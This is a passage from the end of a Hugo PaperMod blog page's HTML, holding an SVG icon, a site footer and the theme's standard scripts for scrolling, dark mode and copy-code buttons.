                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
</div>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="https://0xnibbles.github.io/">nibbles</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
